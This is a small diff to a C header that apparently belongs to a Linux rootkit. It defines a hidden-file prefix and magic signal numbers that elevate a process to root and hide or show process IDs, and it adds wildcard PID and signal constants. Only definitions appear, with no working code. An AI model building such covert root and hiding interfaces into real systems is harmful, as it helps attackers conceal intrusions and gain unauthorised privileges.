@@ -6,8 +6,12 @@
 extern const char S_HIDDEN_PREFIX[];                       // Prefix for hidden files/directories
 #define SZ_HIDDEN_PREFIX_LEN (sizeof(S_HIDDEN_PREFIX) - 1) /* Length of the prefix */
 
-#define SIGROOT 42 /* The signal to send to elevate the current process to root */
-#define SIGHIDE 43 /* The signal to send to hide the process with the given PID */
+#define SIGROOT 42 /* Elevate the current process to root */
+#define SIGHIDE 43 /* Hide the process with the given PID */
+#define SIGSHOW 44 /* Show the process with the given PID */
+
+#define PID_ANY INT_MIN /* Any PID */
+#define SIG_ANY INT_MIN /* Any signal */
 
 #define ROOT_UID (uid_t)0 /* The root user ID */
 #define ROOT_GID (gid_t)0 /* The root group ID */
